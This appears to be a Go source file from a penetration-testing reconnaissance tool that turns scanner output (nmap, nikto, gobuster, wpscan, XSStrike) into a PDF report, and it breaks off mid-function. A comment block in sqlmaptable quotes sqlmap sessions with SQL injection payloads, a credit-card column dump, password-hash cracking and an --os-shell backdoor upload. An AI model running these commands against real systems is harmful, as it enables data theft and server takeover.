// Package handlepdf is responsible for creating a pdf file using gofpdf
// -	"github.com/jung-kurt/gofpdf"
package handlepdf


import (
	// "os"
	"fmt"
	"log"
	"path"
	"path/filepath"
	"strings"
	"time"

	"github.com/jung-kurt/gofpdf"
	//"github.com/jung-kurt/gofpdf/internal/example"
	tooloutparse "github.com/ren-zxcyq/nier/handle/tooloutparse"
	"github.com/ren-zxcyq/nier/utilities"
)

const fontname = "Times"	//"Courier", "Times", "Arial", "Helvetica"
var u utilities.Utils
var toolparser *tooloutparse.Toolparser

type pdfHandler struct {
	installationDir string
	filename        string
	foldername      string

	ucinputInjection	 bool
	subdomainEnumeration bool
	cveRetrieval		 bool
}

func newPdfHandler(installDir, foldername string, ucinputInjection, subdomainEnumeration, cveRetrieval bool) *pdfHandler {
	// fmt.Println("newPDFHANDLER", foldername)
	var h pdfHandler = pdfHandler{
		installationDir: installDir,
		foldername: foldername,
		filename: path.Join(foldername, "Nier_Automaton_Report.pdf"),
		ucinputInjection: ucinputInjection,
		subdomainEnumeration: subdomainEnumeration,
		cveRetrieval: cveRetrieval,
	}
	//fmt.Printf("Address of pdfHandler - %p", &h) //	Prints the address of documentHandler
	//fmt.Println(foldername)
	toolparser = tooloutparse.NewToolparser()
	// fmt.Println("asdfasdfasdf", h.filename)
	return &h
}

func (h *pdfHandler) exCreate() {
	pdf := gofpdf.New("P", "mm", "A4", "")
	pdf.AddPage()
	pdf.SetFont("Arial", "B", 16)
	pdf.Cell(40, 10, "Hello, world")
	err := pdf.OutputFileAndClose(h.filename)

	if err != nil {
		log.Println(err)
	}
}

func CreatePdf(installDir, outputFolderName string, ucinputInjection, subdomainEnumeration, cveRetrieval bool) {
	// fmt.Println("outputfoldername is", outputFolderName)
	pdfHandler := newPdfHandler(installDir, outputFolderName, ucinputInjection, subdomainEnumeration, cveRetrieval)
	// pdfHandler.exCreate()
	err := pdfHandler.pdfCreate()
	if err != nil {
		panic(err)
	}
}

// ExampleFpdf_HTMLBasicNew demonstrates internal and external links with and without basic
// HTML.
// func (h *pdfHandler) pdfCreate() {
// 	pdf := gofpdf.New("P", "mm", "A4", "")
// 	// First page: manual local link
// 	pdf.AddPage()
// 	pdf.SetFont("Helvetica", "", 20)
// 	_, lineHt := pdf.GetFontSize()
// 	pdf.Write(lineHt, "To find out what's new in this tutorial, click ")
// 	pdf.SetFont("", "U", 0)
// 	link := pdf.AddLink()
// 	pdf.WriteLinkID(lineHt, "here", link)
// 	pdf.SetFont("", "", 0)
// 	// Second page: image link and basic HTML with link
// 	pdf.AddPage()
// 	pdf.SetLink(link, 0, -1)
// 	pdf.Image(example.ImageFile("logo.png"), 10, 12, 30, 0, false, "", 0, "http://www.fpdf.org")
// 	pdf.SetLeftMargin(45)
// 	pdf.SetFontSize(14)
// 	_, lineHt = pdf.GetFontSize()
// 	htmlStr := `You can now easily print text mixing different styles: <b>bold</b>, ` +
// 		`<i>italic</i>, <u>underlined</u>, or <b><i><u>all at once</u></i></b>!<br><br>` +
// 		`<center>You can also center text.</center>` +
// 		`<right>Or align it to the right.</right>` +
// 		`You can also insert links on text, such as ` +
// 		`<a href="http://www.fpdf.org">www.fpdf.org</a>, or on an image: click on the logo.`
// 	html := pdf.HTMLBasicNew()
// 	html.Write(lineHt, htmlStr)
// 	fileStr := example.Filename("Fpdf_HTMLBasicNew")
// 	err := pdf.OutputFileAndClose(fileStr)
// 	example.Summary(err, fileStr)
// 	// Output:
// 	// Successfully generated pdf/Fpdf_HTMLBasicNew.pdf
// }

/*	pdfCreate()
//	This should be okay so far but let's replace it with the website version.
func (h *pdfHandler) imageFile(fileStr string) string {
	return filepath.Join(gofpdfDir, "image", fileStr)
}


func (h *pdfHandler) pdfCreate() error {
	pdf := gofpdf.New("P", "mm", "A4", "")
	pdf.AddPage()
	pdf.SetFont("Arial", "B", 16)

	// Set Header
	pdf.SetTopMargin(30)
	pdf.SetHeaderFuncMode(func() {
		pdf.Image(h.imageFile("avatar.png"), 10, 6, 30, 0, false, "", 0, "")
		pdf.SetY(5)
		pdf.SetFont("Arial", "B", 15)
		pdf.Cell(80, 0, "")
		pdf.CellFormat(30, 10, "Title", "1", 0, "C", false, 0, "")
		pdf.Ln(20)
	}, true)
	/*
	// CellFormat(width, height, text, border, position after, align, fill, link, linkStr)
	pdf.CellFormat(190, 7, "Nier - Report", "0", 0, "CM", false, 0, "")

	// ImageOptions(src, x, y, width, height, flow, options, link, linkStr)
	pdf.ImageOptions(
		"avatar.jpg",
		20, 20,
		140, 100,	//
		false,
		gofpdf.ImageOptions{ImageType: "JPG", ReadDpi: true},
		0,
		"",
	)

	pdf.CellFormat(190, 7, "- by zxcyq", "0", 0, "CM", false, 0, "")

	return pdf.OutputFileAndClose(h.filename)
}
*/

// Creates a document -> Sets Header & Creates a table
// 			uses h.newReport() to do so
func (h *pdfHandler) pdfCreate() error {

	//	Create a new PDF doc & write title & current date
	pdf := h.newReport()
	//FROM HERE
	//	Filter Tool Output

	//	Add Target Table
	pdf = h.targettable(pdf)

	//	Add Tools Run Table
	pdf = h.toolstable(pdf)

	//	Add Banner Table
	pdf = h.nmapbannertable(pdf)

	// @TODO	Add CVEs table
	if h.cveRetrieval {
		pdf = h.cvetable(pdf)
	}

	pdf = h.httprinttable(pdf)
	pdf = h.httpmethodstable(pdf)
	pdf = h.robotstxttable(pdf)

	if h.subdomainEnumeration {
		pdf = h.subdomainstable(pdf)
	}
	pdf = h.urlsdiscoveredtable(pdf)	//	maybe change this to add output after all 3 rel & appspider
	pdf = h.nmapComments_MAYBE_table(pdf)
	pdf = h.wpscantable(pdf)

	if h.ucinputInjection {
		// pdf = h.reflectedoutputtable(pdf)		//	Includes findings before any XSS checks take place
		// pdf = h.injectiontesttable(pdf)	//	Includes xsstrike & seleniun checks
		pdf = h.reflectedoutputtable(pdf)
		pdf = h.xsstriketable(pdf)
		pdf = h.seleniumxsstable(pdf)
	}

	pdf = h.nmapvulnstable(pdf)
	pdf = h.niktotable(pdf)


	// pdf = h.xsstriketable(pdf)
	// pdf = h.reflectedoutputtable(pdf)


	//TO HERE
	if pdf.Err() {
		log.Printf("Failed while creating the PDF Report: %s\n", pdf.Error())
		return pdf.Error()
	}

	//	Save
	err := h.savePDF(pdf)
	if err != nil {
		log.Printf("Cannot save PDF: %s\n", err)
		return err
	}
	return nil
}

// This creates the Document template
func (h *pdfHandler) newReport() *gofpdf.Fpdf {
	//	New() creates

	//	"mm" unit for expressing lengths & sizes
	//	"Letter" -> Paper format
	//	"L" or "P" -> Orientation
	//	path to a font directory
	pdf := gofpdf.New("P", "mm", "Letter", "")

	//
	pdf.AddPage()

	//	set font
	//		"B" -> bold
	//		int -> size
	pdf.SetFont(fontname, "B", 28)

	//	Write a text cell of length 40 & height 10.
	//		-	no starting coords
	//			Cell() moves the current pos to the end of the cell
	//					next Cell() will continue after
	pdf.Cell(40, 10, "Nier - Report")

	//	Ln()	->	Moves the current pos to a new line
	//				(optional height param)
	pdf.Ln(12)

	pdf.SetFont(fontname, "", 20)
	var date string = time.Now().Format("2006-01-02 15:04:05 Monday")
	pdf.Cell(40, 10, date)
	pdf.Ln(12)
	//	Note on Cell() & Ln()
	//
	//	Cell() -> No Coordinates
	//		document keeps them internally
	//		advances to the right by the length of the cell being written
	//	Ln() -> moves current position back to the left border & down
	//			by the provided value

	//	Add Logo
	pdf = h.image(pdf)

	//@HERE
	pdf.SetHeaderFunc(func() {
		//?DONE?@TODO	CHANGE THE IMAGE way to the one used earlier
		//pdf.Image(imageFile("image/avatar.jpg"), 10, 6, 30, 0, false, "", 0, "")
		pdf.ImageOptions(
			h.installationDir+"/image/avatar.jpg",
			// 20, 20,
			// 140, 100,	//
			10, 6,
			30, 0,
			false,
			gofpdf.ImageOptions{ImageType: "JPG", ReadDpi: true},
			0,
			"",
		)
		pdf.SetY(5)
		pdf.SetFont("Arial", "B", 15)
		pdf.Cell(80, 0, "")
		pdf.CellFormat(45, 10, "Nier - Report", "B", 0, "C", false, 0, "")
		pdf.Ln(20)
	})
	pdf.SetFooterFunc(func() {
		pdf.SetY(-15)
		pdf.SetFont("Arial", "I", 8)
		pdf.CellFormat(0, 10, fmt.Sprintf("Page %d/{nb}", pdf.PageNo()), "", 0, "C", false, 0, "")
	})
	pdf.AliasNbPages("") //	Defines an alias for the total number of pages
	pdf.AddPage()
	//	HERE Is the Content
	pdf.SetFont(fontname, "", 12)
	// for j := 1; j <= 40; j++ {
	// 	pdf.CellFormat(0, 10, fmt.Sprintf("Printing line number %d", j), "", 1, "", false, 0, "")
	// }

	return pdf
}

func (h *pdfHandler) header(pdf *gofpdf.Fpdf, hdr []string) *gofpdf.Fpdf {
	pdf.SetFont(fontname, "B", 12)
	pdf.SetFillColor(240, 240, 240)
	for _, str := range hdr {
		//	pdf.CellFormat() -> format the new Cell -> +border +background_fill
		pdf.CellFormat(40, 7, str, "1", 0, "LM", true, 0, "")
	}

	//	Pass	-1 ->	Ln()	i.e. use the height of the last printed Cell as the line height
	pdf.Ln(-1)
	return pdf
}

func (h *pdfHandler) table(pdf *gofpdf.Fpdf, tbl [][]string) *gofpdf.Fpdf {

	//	Font & Fill Color
	pdf.SetFont(fontname, "", 14)
	pdf.SetFillColor(255, 255, 255)

	//	Allign columns according to their contents
	align := []string{"L", "C", "L", "R", "R", "R"} //"No.","Tool"
	for _, line := range tbl {
		for i, str := range line {
			// //	CellFormat() -> Create a visible border around the cell
			// //	alignStr param is used to align the cell content either Left or Right
			// fmt.Println(i,"-hie-",str)
			pdf.CellFormat(40, 7, str, "1", 0, align[i], false, 0, "")
		}
		pdf.Ln(-1)
	}
	return pdf
}

func (h *pdfHandler) singlelinetable(pdf *gofpdf.Fpdf, tbl []string) *gofpdf.Fpdf {

	//	Font & Fill Color
	// pdf.SetFont("Times", "", 12)
	pdf.SetFont(fontname, "", 10) //	fontname, "B", 12
	pdf.SetFillColor(255, 255, 255)	//	(240, 240, 240)

	//	Allign columns according to their contents
	// align := []string{"L", "C", "L", "R", "R", "R"} //"No.","Tool"
	for _, line := range tbl {

		r := strings.TrimSpace(line)
		l := len(r)
		if (l == 0) || (l == 1) {
			// fmt.Println("CONT'D")
			continue
		} else {
			// // for i, str := range line {
			// // // 	//	CellFormat() -> Create a visible border around the cell
			// // // 	//	alignStr param is used to align the cell content either Left or Right
			// // 	fmt.Println(i,"-hie-",str)
			// // 	pdf.CellFormat(40, 7, string(str), "1", 0, align[i], false, 0, "")
			// fmt.Println(string(line))

			pdf.CellFormat(195, 7, string(line), "1", 0, "LM", true, 0, "")

			// }
		}
		pdf.Ln(-1)
	}
	return pdf
}

// // ImageFile returns a qualified filename in which the path to the image
// // directory is prepended to the specified filename.
// func (h *pdfHandler) imageFile(fileStr string) string {
// 	return filepath.Join(h.installationDir, "image", fileStr)
// }

func (h *pdfHandler) image(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	//	ImageOptions() takes a file path, x,y,width & height params
	//						&	ImageOptions struct to specify a couple of options
	// pdf.ImageOptions(
	// 	h.imageFile("avatar.jpg"),
	// 	255, 10,
	// 	25, 25,
	// 	false,
	// 	gofpdf.ImageOptions{ImageType:"JPG", ReadDpi: true},
	// 	0,
	// 	"",
	// )
	pdf.ImageOptions(
		h.installationDir+"/image/avatar.jpg",
		// 20, 20,
		// 140, 100,	//
		40, 70,
		140, 100,
		false,
		gofpdf.ImageOptions{ImageType: "JPG", ReadDpi: true},
		0,
		"",
	)
	if pdf.Err() {
		fmt.Printf("Failed while adding image to the PDF Report: %s\n", pdf.Error())

	}

	return pdf
}

func (h *pdfHandler) savePDF(pdf *gofpdf.Fpdf) error {
	return pdf.OutputFileAndClose(h.filename)
}

func (h *pdfHandler) targettable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "Target: Online")
	pdf.Ln(-1)

	// tableCols := []string{"Port", "Service"}
	// tableCont := [][]string{
	// 	{"80", "Apache 2.2"},
	// 	{"110", "Apache 2.2"},
	// }

	////////////////////////////////////////////////////////////////////////////////////////
	//	Filter NMAP output
	var nmapOutFilesURL string = path.Join(h.foldername, "nmap_1_sSV.nmap")
	nmapOutFilesURL = filepath.ToSlash(nmapOutFilesURL)
	//nmapOutFilesURL = strings.Replace(nmapOutFilesURL, ":", "", -1)
	var nmap string = u.ReturnFileContentsStr(nmapOutFilesURL)

	res := toolparser.ParseNmapSV(nmap)

	var strCont []string
	var tmp []string
	// fmt.Println(res)
	////////////////////////////////////////////////////////////////////////////////////////
	tmp, err := u.StringToLines(res)
	if err != nil {
		log.Println("Failed while separating lines in formatted tool output")
	}
	//fmt.Println(strCont)
	/*
		var x []string
		for _,v := range strCont {
			// // fmt.Println(k,"-",v)
			// x = strings.Fields(v)
			x = strings.SplitAfterN(v, "\t", 4)
			//fmt.Println(x)
			for u,uu := range x {
				fmt.Println(u,"-",uu)
			}
		}
	*/

	/*	@UNCOMMENT
		tableCols := tableCont[0]
		tableCont = tableCont[1:]
	*/

	for _,l := range tmp {
		if len(l) > 0 {
			strCont = append(strCont,l)
		}
	}
	pdf = h.examplemultiwraptable(pdf, strCont)

	/*
		for _, line := range tableCont {
			r := strings.TrimSpace(line)
			l := len(r)
			if (l == 0) || (l == 1) || (r == "|") {
				// // fmt.Println(`AAAAAAAAAAAAAAAAAAAAAAA`)
				// // pdf.CellFormat(195, 7, "MARKED", "1", 0, "LM", false, 0, "")
				// // pdf.Ln(-1)
				// continue
				// // // for i, str := range line {
				// // pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
				// // pdf.Ln(-1)
				// // // fmt.Println("hELLOS", line)
				// // // }
				continue

			} else {
				// for i, str := range line {
				pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
				pdf.Ln(-1)
				// fmt.Println("hELLOS", line)
				// }
				//continue
			}
		}
	*/
	/*	@UNCOMMENT
		pdf = h.header(pdf, tableCols)
		pdf = h.table(pdf, tableCont)

		pdf.SetFont(fontname, "B", 12)
		pdf.SetFillColor(240, 240, 240)
	*/
	return pdf
	// CellFormat(width, height, text, border, position after, align, fill, link, linkStr)
	// pdf.CellFormat(190, 7, "Nier - Report", "0", 0, "CM", false, 0, "")
}

func (h *pdfHandler) toolstable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.AddPage()
	// pdf.Ln(-1)
	// pdf.SetFont("Arial", "B", 16)
	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 12, "Commands Run")
	pdf.Ln(-1)
	tableCols := []string{"Tool", "Description", "Command Opts"}
	tableCont := [][]string{
		{"1", "ping", "Initial interaction", "ping -c 1 $TARGET"},
		{"2", "nmap", "Version scan", "nmap -sSV $TARGET"},
		{"3", "nmap", "Vulnerability scan", "nmap --script=vuln $TARGET"},
		{"4", "nikto", "Vuln Testing", "nikto -h $TARGET"},
		{"5", "gobuster", "Folder Enumeration", "gobuster dir -w -u"},
	}

	//	Create Table Header & Fill
	//pdf = h.header(pdf, tableCols)
	pdf.SetFont(fontname, "", 10)
	pdf.SetFillColor(240, 240, 240)

	pdf.CellFormat(8, 7, "No.", "1", 0, "LM", true, 0, "")
	for i, str := range tableCols { //		for i, str := range tableCols {
		////	pdf.CellFormat() -> format the new Cell -> +border +background_fill
		//pdf.CellFormat(40, 7, str, "1", 0, "LM", true, 0, "")
		if i == 0 {
			pdf.CellFormat(25, 7, str, "1", 0, "CM", true, 0, "")
		} else if i == 1 {
			//	CellFormat() -> Create a visible border around the cell
			//	alignStr param is used to align the cell content either Left or Right
			pdf.CellFormat(50, 7, str, "1", 0, "CM", true, 0, "")
		} else if i == 2 {
			pdf.CellFormat(110, 7, str, "1", 0, "CM", true, 0, "")
		}
		//	Consider handling more columns? even thought this is a specific func.
	}

	//	Pass	-1 ->	Ln()	i.e. use the height of the last printed Cell as the line height
	pdf.Ln(-1)
	// pdf = h.table(pdf, tableCont)
	pdf.SetFont(fontname, "", 10)
	pdf.SetFillColor(255, 255, 255)

	// Allign columns according to their contents
	align := []string{"L", "C", "L", "L", "R", "R"} //"No.","Tool"
	for _, line := range tableCont {
		for i, str := range line { //	i -> 0, 1,2,3
			if i == 0 {
				pdf.CellFormat(8, 7, line[0], "1", 0, "LM", true, 0, "")
			} else if i == 1 {
				pdf.CellFormat(25, 7, str, "1", 0, align[i], true, 0, "")
			} else if i == 2 {
				//	CellFormat() -> Create a visible border around the cell
				//	alignStr param is used to align the cell content either Left or Right
				pdf.CellFormat(50, 7, str, "1", 0, align[i], true, 0, "")
			} else if i == 3 {
				pdf.CellFormat(110, 7, str, "1", 0, align[i], true, 0, "")
			}
			//	Consider handling more columns? even thought this is a specific func.
		}
		pdf.Ln(-1)
	}

	return pdf
}

func (h *pdfHandler) nmapvulnstable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf { //*gofpdf.Fpdf

	//return pdf
	var nmapOutFilesURL string = path.Join(h.foldername, "nmap-vuln.nmap")
	// fmt.Println("HHHHHHHHHHHHHHHHHHHHHHH", nmapOutFilesURL)
	nmapOutFilesURL = filepath.ToSlash(nmapOutFilesURL)
	// fmt.Println("HHHHHHHHHHHHHHHHHHHHHHH", nmapOutFilesURL)

	//nmapOutFilesURL = strings.Replace(nmapOutFilesURL, ":", "", -1)
	var nmap string = u.ReturnFileContentsStr(nmapOutFilesURL)

	res := toolparser.ParseNmapVuln(nmap)

	// fmt.Println("@@@@@@@")
	// fmt.Println(res)							//	res contains filtered tool output

	tableCont, err := u.StringToLines(res)
	if err != nil {
		log.Println("Failed while separating lines in formatted tool output")
	}

	pdf.AddPage()
	// pdf.Ln(-1)

	//	Create Table Header & Fill
	//pdf = h.header(pdf, tableCols)
	pdf.SetFont(fontname, "B", 14)
	pdf.SetFillColor(240, 240, 240)

	pdf.Cell(40, 10, "Nmap: Vulnerability Scan Results")
	pdf.Ln(-1)
	// tableCols := []string{"Tool", "Description", "Command Opts"}
	// tableCont := [][]string{
	// 	{"1", "ping", "Initial interaction", "ping -c 1 $TARGET"},
	// }

	pdf.SetFont(fontname, "", 10)
	pdf.SetFillColor(255, 255, 255)

	for _, line := range tableCont {
		r := strings.TrimSpace(line)
		l := len(r)
		if (l == 0) || (l == 1) || (r == "|") {
			// // fmt.Println(`AAAAAAAAAAAAAAAAAAAAAAA`)
			// // pdf.CellFormat(195, 7, "MARKED", "1", 0, "LM", false, 0, "")
			// // pdf.Ln(-1)
			// continue
			// // // for i, str := range line {
			// // pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
			// // pdf.Ln(-1)
			// // // fmt.Println("hELLOS", line)
			// // // }
			continue

		} else {
			// for i, str := range line {
			pdf.CellFormat(195, 7, line, "TB", 0, "LM", false, 0, "")	//	"1" -> "TB"
			pdf.Ln(-1)
			// fmt.Println("hELLOS", line)
			// }
			//continue
		}
	}

	return pdf
}

// /root/Desktop/report/nmap-vuln.nmap
// nmap-vuln.nmap
func (h *pdfHandler) urlsdiscoveredtable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf { //*gofpdf.Fpdf
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "URLs Identified")
	pdf.Ln(-1)

	////////////////////////////////////////////////////////////////////////////////////////
	//	Filter Gobuster output
	var detectedURLsURL string = path.Join(h.foldername, "spider_URLs.list")	//"urls_used_during_detection.txt")	//	they both have the same length
	//gobusterOutURL = filepath.ToSlash(gobusterOutURL)
	//gobusterOutURL = strings.Replace(gobusterOutURL, ":", "", -1)
	// fmt.Println("||||||||||\r\n",gobusterOutURL)
	var detectedURLstring string = u.ReturnFileContentsStr(detectedURLsURL)
	// res := gobuster	//toolparser.ParseNmapSV(gobuster)
	res := toolparser.ParseGobusterAndSpidersLinks(detectedURLstring)
	// fmt.Println("******\r\n",gobuster)
	// fmt.Println("******\r\n",res)

	////////////////////////////////////////////////////////////////////////////////////////
	// fmt.Println("res = ", res)
	// strCont, err := u.StringToLines(res)
	// if err != nil {
	// 	log.Println("Failed while separating lines in formatted tool output")
	// }
	// pdf = h.singlelinetable(pdf, strCont)
	pdf = h.examplemultiwraptable(pdf, res)
	return pdf
}

func (h *pdfHandler) sqlmaptable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	/*
		available databases [2]:
		[*] information_schema
		[*] webscantest

		Database:
		Table:
		[5 columns]

		| Column	|	Type	|

	*/

	/*
			--dump-all
			--dump

			sqlmap -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --dump -C billing_CC_number -T orders -D webscantest


			Parameter: id (GET)
				Type: boolean-based blind
				Title: AND boolean-based blind - WHERE or HAVING clause
				Payload: id=4 AND 4034=4034

				Type: error-based
				Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
				Payload: id=4 AND (SELECT 3863 FROM(SELECT COUNT(*),CONCAT(0X7172193123))) .... GROUP BY x)a)

				Type: AND/OR time-based blind
				Title: MySQL >= 5.0.12 AND time-based blind
				Payload: id=4 AND SLEEP(2)

				Type: UNION query
				Title: Generic UNION query (NULL) - 4 columns
				Payload: id=4 UNION ALL SELECT NULL, CONCAT (......)

				...


				[08:52:04] [INFO] table 'webscantest.orders' dumped to CSV file '/root/.sqlmap/output/www.webscantest.com/'
				[08:52:04] [INFO] fetched data logged to text files under /root/.sqlmap/output/www.webscantest.com'


				https://github.com/sqlmapproject/sqlmap/wiki/Usage



				sqlmap identified the following injection point(s) with a total of 44 HTTP(s) requests:
				---
				Parameter: id (GET)
					Type: boolean-based blind
					Title: AND boolean-based blind - WHERE or HAVING clause
					Payload: id=1 AND 2623=2623

					Type: error-based
					Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
					Payload: id=1 AND (SELECT 2980 FROM(......))

					Type: AND/OR time-based blind
					Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
					Payload: id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))MVIi)

					Type: UNION query
					Title: Generic UNION query (NULL) - 3 columns
					Payload: id=1 UNION ALL SELECT NULL, CONCAT(...., ....,....), NULL-- GseO
				---
				[17:22:22] [INFO] the back-end DBMS is MySQL
				[17:22:22] [INFO] fetching banner
				web application technology: PHP 5.2.6, Apache 2.2.9
				back-end DBMS: MySQL 5.0
				banner:		'5.1.41-3~bpo50+1'
				[17:22:22] [INFO] fetched data logged to text files under '/home/stamparm/.sqlmap/output/debiandev'

		=====

		python sqlmap.py -u "http://debiandev/sqlmap/mysql/get_int.php?id=1" --batch --password
		[17:22:22] [INFO] fetching database users password hashes
		do you want .....with other tools [y/N] N
		do you want .....against retrieved password hashes? [Y/n/q] Y
		[17:22:22] [INFO] using hash method 'mysql_passwd'
		what dictionary do you want to use?
		[1] default dictionary file '' (press Enter)
		[2] custom dictionary file
		[3] file with list of dictionary files
		> 1
		[17:22:22] [INFO] using default dictionary
		....
		...
		...
		[17:22:22] [INFO] cracked password 'testpass' for user 'root'
		[*] debian-sys-maint [1]:
			password hash: *ASDFASLDKFJASLDKFJASDF
		[*] root [1]:
			password hash: *ASDFASDFASDFASDFASDFAS
			clear-text password: testpass

		=====

		python ... --batch --dbs
		...
		[17:22:22] [INFO] fetching database names
		available databases [5]:
		[*] information_schema
		[*] master
		[*] mysql
		[*] owasp10
		[*] testdb

		... fetched...


		python ... --batch --tables -D testdb
		[17:22:22] [INFO] fetching tables for database: 'testdb'
		Database: testdb
		[1 table]
		+-------+
		| users |
		+-------+

		... fetched ...

		===

		--batch --dump -T users -D testdb
		[17:22:22] [INFO] fetching columns for table 'users' in database 'testdb'
		[17:22:22] [INFO] fetching entries for table 'users' in database 'testdb'
		[17:22:22] [INFO] analyzing table dump for possible password
		Database: testdb
		Table: users
		[4 entries]
		+-----+-----------+--------------------------+
		 1
		 2
		 3
		 4   | ........

		[17:22:22] [INFO] table 'testdb.users' dumped to CSV file '/home/....'
		[17:22:22] [INFO] fetched data logged to text files under '/home/....'


		===
		python sqlmap.py -u "http://debiandev/..." --batch --os-shell
		[17:22:22] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
		[17:22:22] [INFO] the file stager has been successfully uploaded on '/var/www/' - http:// ....
		[17:22:22] [INFO] the backdoor has been successfully uploaded on '/var/www/' - http://debiandev:80/tmpbsadf.php
		[17:22:22] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

		os-shell> pwd
		do you want to retrieve the command standard output? [Y/n/a] Y
		command standard output:
		---
		INFORMIXTMP
		bin
		boot
		cdrom
		dev
		etc
		---
		os-shell> exit
		[17:22:22] [INFO] cleaning up the web files uploaded
		[17:22:22] [WARNING] HTTP error codes detected during run:
		404 (Not Found) - 2 times
		[17:22:22] [INFO] fetched data logged to text files under '/home/...'

		...
	*/
	return nil
}

func (h *pdfHandler) nmapbannertable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	//	nmap banner grabbing
	//	nmap -p- -Pn -vv -sTV -T5 --script=banner -oA /root/Desktkop/nmap-banners 192.168.1.20
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "Nmap: Banners Scan")
	pdf.Ln(-1)

	// Filter output
	var nmapBannersOutURL string = path.Join(h.foldername, "nmap-banners.nmap")
	var bannersout string = u.ReturnFileContentsStr(nmapBannersOutURL)
	res := toolparser.ParseBanners(bannersout)

	pdf = h.examplemultiwraptable(pdf, res)
	
	return pdf
}


func (h *pdfHandler) nmapComments_MAYBE_table(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	// BELOW or nmap -p80 --script=http-* -oN .. 192.168.1.20
	// nmap -p80 --script=http-comments-displayer 192.168.1.20 -oN ouptputdir+'/nmap-comments-displayer'
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "Nmap: Perhaps Interesting Application Comments")
	pdf.Ln(-1)

	//	Filter output
	var nmapCommentsOutURL string = path.Join(h.foldername, "nmap-comments.nmap")
	var commentsout string = u.ReturnFileContentsStr(nmapCommentsOutURL)
	res := toolparser.ParseComments(commentsout)

	pdf = h.examplemultiwraptable(pdf, res)

	return pdf
}

func (h *pdfHandler) httprinttable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "httprint: Web Server Fingerprinting - Version Guessing")
	pdf.Ln(-1)

	//	Filter output
	var httprintOutURL string = path.Join(h.foldername, "/httprint-srv-version")
	var httprintout string = u.ReturnFileContentsStr(httprintOutURL)
	res := toolparser.ParseHTTPrint(httprintout)

	pdf = h.examplemultiwraptable(pdf, res)

	return pdf
}

func (h *pdfHandler) niktotable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {

	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "nikto: Web Server Vulnerability Testing")
	pdf.Ln(-1)

	//	Filter output
	var niktoOutURL string = path.Join(h.foldername, "nikto.txt")
	var niktoout string = u.ReturnFileContentsStr(niktoOutURL)
	res := toolparser.ParseNikto(niktoout)

	// pdf = h.singlelinetable(pdf, res)
	pdf = h.examplemultiwraptable(pdf, res)

	return pdf
}

func (h *pdfHandler) httpmethodstable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40,10, "HTTP: Method - Status")
											//	@TODO	Add	-	Check: httptesting.txt")
	pdf.Ln(-1)


	var httptestingOutURL string = path.Join(h.foldername, "httptesting.txt")
	var httptestingout string = u.ReturnFileContentsStr(httptestingOutURL)
	res := toolparser.ParseHTTPMethods(httptestingout)

	pdf = h.examplemultiwraptable(pdf, res)

	return pdf
}

func (h *pdfHandler) robotstxttable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40,10, "Contents of /robots.txt")
											//	@TODO	Add	-	Check: httptesting.txt")
	pdf.Ln(-1)

	var robotstxtOutURL string = path.Join(h.foldername, "/getrobots.txt")
	var robotstxtout string = u.ReturnFileContentsStr(robotstxtOutURL)
	res := toolparser.ParseRobots(robotstxtout)

	pdf = h.examplemultiwraptable(pdf, res)

	return pdf
}

func (h *pdfHandler) whatwebtable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.AddPage()
	pdf.Cell(40, 10, "whatweb Table")
	pdf.Ln(-1)
	return nil
}

func (h *pdfHandler) wpscantable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	// @TODO	tool output is a folder		Consider just using a str for this
	// h.execCmd(h.e.tools["wpscan"] + " -o " + filepath.ToSlash(path.Join(h.e.outputFolder, "/wpscan-out")) + " --url " + h.e.targetHost)
	pdf.AddPage()
	pdf.Cell(40, 10, "WPScan Table")
	pdf.Ln(-1)

	var wpscanoutURL string = path.Join(h.foldername, "/wpscan_out")
	var wpscanoutstring string = u.ReturnFileContentsStr(wpscanoutURL)
	res := toolparser.ParseWPScanner(wpscanoutstring)

	pdf = h.examplemultiwraptable(pdf, res)

	return pdf
}

func (h *pdfHandler) xsstriketable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {

	var reflectedoutputURL string = path.Join(h.foldername, "python3_out")//"/xsstrike.txt")//	"/form_injection_detection.txt")
	var reflectedoutputstring string = u.ReturnFileContentsStr(reflectedoutputURL)
	res := toolparser.ParseXSStrikeOutput(reflectedoutputstring)

	// for _,i := range res {
	// 	fmt.Println("=>",i)
	// }
	if len(res) > 0 {
		pdf.AddPage()
		pdf.Cell(40, 10, "XSStrike Table")
		pdf.Ln(-1)

		pdf = h.examplemultiwraptable(pdf, res)
	}
